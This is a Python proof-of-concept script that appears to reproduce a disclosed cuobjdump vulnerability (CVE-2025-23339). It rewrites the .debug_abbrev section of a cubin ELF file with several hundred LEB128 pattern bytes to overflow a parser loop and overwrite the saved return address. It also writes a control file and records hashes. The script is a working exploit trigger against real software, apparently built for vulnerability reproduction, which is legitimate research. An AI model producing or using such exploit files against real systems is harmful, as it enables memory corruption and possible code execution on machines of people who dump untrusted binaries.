#!/usr/bin/env python3
"""CVE-2025-23339 mutator.

Hypothesis (from TALOS-2025-2155): cuobjdump's .debug_abbrev parser loops over
DW_AT/DW_FORM LEB128 pairs with no bound on the pair count, storing both decoded
values as dwords at rbp + r14*8 (-8 and -4).  ~0x108 iterations overwrite the
saved return address of the parsing frame.  So: give the ELF a .debug_abbrev
section whose attribute/form pair stream is long and attacker-controlled, then
ask cuobjdump to dump the ELF (--dump-elf).

Mutation (structure aware, byte exact):
  1. locate the .debug_abbrev section through the real section header table and
     the real .shstrtab;
  2. build a new section body: valid abbrev-code / tag / has_children prologue,
     then N copies of a chosen LEB128 byte pattern, then a terminating 0;
  3. append that body at EOF (so nothing else moves), repoint sh_offset/sh_size
     of that one section header, leave every other byte untouched.
A paired control (CONTROL) rebuilds the same file with the original section body
and original sh_offset/sh_size, so old==new must be byte identical.
"""
import hashlib
import json
import struct
import sys

PATTERN = 0x41          # 'A' -> single byte LEB128 value 0x41
NVALUES = 0x260         # > 0x210 values needed to reach the return address


def parse_elf(data):
    assert data[:4] == b"\x7fELF", "not an ELF"
    ei_class = data[4]
    ei_data = data[5]
    assert ei_class == 2 and ei_data == 1, "expect ELF64 LE cubin"
    e_shoff, = struct.unpack_from("<Q", data, 0x28)
    e_shentsize, e_shnum, e_shstrndx = struct.unpack_from("<HHH", data, 0x3A)
    secs = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        name, stype, flags, addr, offset, size = struct.unpack_from("<IIQQQQ", data, off)
        link, info, align, entsize = struct.unpack_from("<IIQQ", data, off + 0x28)
        secs.append(dict(idx=i, name_off=name, type=stype, offset=offset, size=size,
                         link=link, info=info, align=align, entsize=entsize,
                         hdr_off=off))
    shstr = secs[e_shstrndx]
    strtab = data[shstr["offset"]:shstr["offset"] + shstr["size"]]

    def name_of(s):
        end = strtab.find(b"\x00", s["name_off"])
        return strtab[s["name_off"]:end].decode()

    for s in secs:
        s["name"] = name_of(s)
    return secs, e_shoff, e_shentsize


def build(src, dst, control=False, pattern=PATTERN, nvalues=NVALUES):
    data = bytearray(open(src, "rb").read())
    secs, e_shoff, e_shentsize = parse_elf(bytes(data))
    tgt = [s for s in secs if s["name"] == ".debug_abbrev"]
    if not tgt:
        raise SystemExit("no .debug_abbrev in %s (sections=%s)" % (
            src, [s["name"] for s in secs]))
    t = tgt[0]
    old_body = bytes(data[t["offset"]:t["offset"] + t["size"]])
    if control:
        body = old_body
        new_off = t["offset"]
    else:
        body = bytes([0x01, 0x11, 0x01]) + bytes([pattern]) * nvalues + b"\x00"
        new_off = len(data)
        data += body
    if not control:
        struct.pack_into("<Q", data, t["hdr_off"] + 0x18, new_off)   # sh_offset
        struct.pack_into("<Q", data, t["hdr_off"] + 0x20, len(body))  # sh_size
    open(dst, "wb").write(bytes(data))
    rec = dict(src=src, dst=dst, control=control, section=".debug_abbrev",
               shdr_offset_field=t["hdr_off"] + 0x18,
               old_sh_offset=t["offset"], new_sh_offset=new_off,
               old_sh_size=t["size"], new_sh_size=len(body),
               old_body_sha256=hashlib.sha256(old_body).hexdigest(),
               new_body_sha256=hashlib.sha256(body).hexdigest(),
               pattern=hex(pattern), nvalues=nvalues,
               src_sha256=hashlib.sha256(open(src, "rb").read()).hexdigest(),
               dst_sha256=hashlib.sha256(open(dst, "rb").read()).hexdigest(),
               dst_size=len(open(dst, "rb").read()))
    return rec


if __name__ == "__main__":
    src = sys.argv[1]
    recs = [build(src, "mut.cubin"),
            build(src, "control.cubin", control=True)]
    print(json.dumps(recs, indent=2))